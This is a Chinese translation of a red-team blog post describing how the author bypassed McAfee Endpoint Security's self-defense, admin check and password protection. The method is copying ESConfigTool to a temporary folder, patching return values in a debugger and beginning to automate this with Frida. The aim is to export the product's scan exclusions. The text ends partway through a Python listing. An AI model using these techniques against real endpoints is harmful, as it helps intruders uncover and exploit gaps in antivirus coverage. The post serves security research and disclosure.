文章出处[Bypass McAfee with McAfee](https://github.com/dmaasland/mcfridafee)
## 0x00 Introduction
我实际上并没有计划撰写此 blog文章。并不是因为文章本身设计到什么密码，而是因为我本人超级懒，这文章还是因为
[@fsdominguez](https://twitter.com/fsdominguez) 和
[_dirkjan](https://twitter.com/_dirkjan) 逼迫我写的。
这文章的内容写的是关于我在进行红队任务期间是如何使用 `McAfee` 工具绕过 `McAfee Endpoint Security`。
## 0x01 McAfee
在以前，每当在任务中遇到 `McAfee Virus Scan
Enterprise(VSE)`时，我们都会暗自窃喜。因为之前通过注册表查询，可以获取到管理员所设置的排除项。
但是在这次任务中，从 **眉开眼笑** 到 **愁眉不展** 。这是因为什么呢，是因为它们现在使用的是 `McAfee Endpoint
Security`。之所以弃用了 `VSE`，是因为 `McAfee` 中有的人觉得最好不要在任何人都能访问到的地方以明文形式存储类似排除项等类似的信息。
## 0x02 ESConfigTool
通过资料查询验证，`McAfee Endpoint Security` 会附带一个名为 `ESConfigTool`
的程序。该程序可用于导入和导出配置文件。它的用法在 [这里](https://docs.mcafee.com/bundle/endpoint-security-10.6.0-installation-guide-unmanaged-windows/page/GUID-31F0BE99-2186-4C4E-B0E3-96F3FED8DF49.html) 有描述。
事实证明，想要从 `McAfee Endpoint Security` 获取配置（排除项等信息），你只需要：
  * 解锁密码
  * 管理权限
但是我们都没有，我们下载一个 `McAfee Endpoint Security` 的 `Evaluation` 版本进行测试，看看有什么可以利用的
## 0x03 Reversing
现在，事情变得有些棘手了。我现在的状态大概就像是一个擅长逆向工程的醉酒的猴子
==》碰运气。因此，我们还是从头开始，看看是否可以利用此工具。首先是创建了三个排除项。
  * C:\Windows\Temp\
  * *mimikatz.exe
  * C:\TotallyLegit\
此外，我还启用了密码保护设置。密码为：`starwars`
此时，我们打开一个管理命令提示符，查看是否可以通过 `ESConfigTool`获取其配置信息
    Microsoft Windows [Version 10.0.16299.15]
    (c) 2017 Microsoft Corporation. All rights reserved.
    C:\Windows\system32>"C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\ESConfigTool.exe" /export C:\Export.xml /module TP /unlock starwars /plaintext
    Command executed successfully. Please refer to Endpoint Security logs for details
    C:\Windows\system32>
让我们打开 `XML`，看看其中是否包含所创建的排除项：
            C:\Windows\Temp\
            0
            3
            1
            1
            1
            0
            **\*mimikatz.exe
            0
            3
            0
            1
            1
            0
            C:\TotallyLegit\
            0
            3
            1
            1
            1
            0
嘤嘤嘤！在有`管理员权限`及`密码`的情况下，它是可以完整获取得配置信息。我们附加一个调试器，看看它是如何工作的。
## 0x04 Self-defense
通常，附加调试器只是打开调试器，选择二进制程序文件以及所需命令参数。但是，由于我们正在处理安全解决方案，因此会有一些其他的障碍，比如：McAfee
的大多数组件都会收到其产品的 `“Self-defense”` 功能的保护。如果尝试载入Debug，会提示 `“Debugging stop”`，并且会在
`Self-defense` 日志有所提示。
    12/10/2019 12:47:09   mfeesp(2204.6392)  ApBl.SP.Activity: DESKTOP-DNUK2R5\admin ran X64DBG.EXE, which attempted to access ESCONFIGTOOL.EXE, violating the rule "Core Protection - Protect McAfee processes from unauthorized access and termination", and was blocked. For information about how to respond to this event, see KB85494.
    12/10/2019 12:47:09   mfeesp(2204.5404)  ApBl.SP.Activity: DESKTOP-DNUK2R5\admin ran X64DBG.EXE, which attempted to access ESCONFIGTOOL.EXE, violating the rule "Core Protection - Protect McAfee processes from unauthorized access and termination", and was blocked. For information about how to respond to this event, see KB85494.
如今，通过反复试验，我们发现 `"Super 1337, z3r0 d4y, APT-style nation state"`
的技术可以绕过自我防御机制。你准备好了吗？
    Microsoft Windows [Version 10.0.16299.15]
    (c) 2017 Microsoft Corporation. All rights reserved.
    C:\Users\admin>mkdir \temp
    C:\Users\admin>cd \temp
    C:\temp>copy "C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\ESConfigTool.exe" .
            1 file(s) copied.
    C:\temp>copy "C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\blframework.dll" .
            1 file(s) copied.
    C:\temp>copy "C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\EpSecApiLib.dll" .
            1 file(s) copied.
    C:\temp>copy "C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\McVariantExport.dll" .
            1 file(s) copied.
    C:\temp>copy "C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\LogLib.dll" .
            1 file(s) copied.
    C:\temp>
黑人感叹号！！！我们此时甚至不需要管理员权限，就可以进行复制操作，完成接下来的调试过程。这无疑是一个巨大的成功，重新添加调试器，就可以等待狂欢：
现在怎么办？？
## 0x05 Bypassing the password check
往下走，看看带入不正确的密码会发生什么。也许可以为我们提供一些搜索字符串。
    C:\Windows\system32>"C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\ESConfigTool.exe" /export C:\Export.xml /module TP /unlock startrek /plaintext
    There were some errors while executing command. Please refer to Endpoint Security logs for details
    C:\Windows\system32>
嗯，这个提示很简单。但是 `McAfee 日志文件`可以提供更多的信息 :
    10/12/2019 01:11:46.400 PM ESConfigTool(5476.8840)  ESConfigTool.ESConfigTool.Error (ImportExportUtil.cpp:677): Failed to unlock client settings with user supplied password, TriggerAction failed
然后将上面获取到的字符串在调试器中进行搜索，看看是否可以找到发生此错误发生的位置。
很好，如果我们将其断点并再次运行，它将达到该断点。然后，如果我们查看在该断点之前发生的情况，我们可以看到对名为 `"BLInvokeMethod"`
的函数今夕了功能调用，然后进行本例中为执行的跳转。
在这一点上，我们需要选择下一步是怎么走。我们可以
  * 深入研究密码检查功能，了解其工作原理，然后尝试破解绕过。
  * 让密码保护功能运行后，修改其返回值。
显然，我很懒，所以选择了第二项。当输入错误的密码时，密码检查功能会在 `RAX 寄存器`中放置一个错误代码：
如果提供了正确的密码，则在 `RAX 寄存器`的值为 0。
那么，如果我们提供了不正确的密码，中断了密码检查功能，并将 `RAX 寄存器`更改为 **0** ，会发生什么呢？我们试一试：
木得办法！
原来，密码正确与否的检查工作我由工具本身完成的。解密或导出配置并不是真正需要这个密码、这是一个失败的尝试。one to go.
## 0x06 Bypassing the admin check
虽然输入错误的密码会给你一种清晰的错误提示信息，但是在没有管理员特权的情况下运行该工具，只会输出 help 信息。
    Microsoft Windows [Version 10.0.16299.15]
    (c) 2017 Microsoft Corporation. All rights reserved.
    C:\Users\user>"C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\ESConfigTool.exe" /export C:\temp\Export.xml /module TP /unlock starwars /plaintext
    Description:
          Endpoint security configuration tool for exporting and importing policy configuration. User needs administrator privileges to run this utility. Utility needs password if the client interface is password protected. File supplied for import must be an encrypted file.
    USAGE:
          ESConfigTool.exe /export  [/module  ] [/unlock  ] [/plaintext ]
          ESConfigTool.exe /import  [/module  ] [/unlock  ] [/policyname  ]
          ESConfigTool.exe /help
    C:\Users\user>
日志中也没有任何的内容。
我们如何找出管理员检查的内容？同理，我们以普通用于身份运行调试器，看看会发生什么。原来它是调用了一个函数，对返回值进行比较，如果返回码为 **0**
，则调用 `exit`。
如果你遵循此功能，则程序最终将会调用 [AllocateAndInitializeSid](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-allocateandinitializesid)。同上面绕过密码检查的方案，修改返回码。
深入研究发现，返回值是在这里进行检查的：
尽管这次返回值必须为 **0** 以外的 **任何值**
boom，它可以继续进行！！
现在，我们重新尝试，在没有管理员权限，且不知道密码的情况导出 `McAfee Endpoint Security` 的配置信息。
## 0x07 Doing it automatically
到此，结果很酷，但是每次手动进行调试、更改等操作都是很痛苦的。幸运的是，我们有 [Frida](https://www.frida.re/) 。对于那些熟悉
Frida 的人，无需掌握 JavaScript 知识以外任何技能，就可以帮你执行所有很酷的操作，例如：挂钩函数和更改值。
但是我们如何将 Frida 注入 `McaAfee` ？简单，我们使用 [frida-server](https://github.com/frida/frida/releases/download/12.7.9/frida-server-12.7.9-windows-x86_64.exe.xz)。只需要在运行 `McAfee` 的机器上启动它，然后使用 `Python`
进行连接即可：
### 7.1、McAfee 机器:
    Microsoft Windows [Version 10.0.16299.15]
    (c) 2017 Microsoft Corporation. All rights reserved.
    C:\Users\admin>cd \temp
    C:\temp>frida-server-12.7.9-windows-x86_64.exe
### Python 机器:
    Python 3.6.7 (default, Oct 22 2018, 11:32:17) 
    [GCC 8.2.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> import frida
    >>> devmgr = frida.get_device_manager()
    >>> devmgr.add_remote_device('192.168.31.150')
    Device(id="PI:EMAIL", name="192.168.31.150", type='remote')
    >>> rdev = frida.get_device('PI:EMAIL')
    >>> args = [
    ...   'ESConfigTool.exe',
    ...   '/export',
    ...   'frida-export.xml',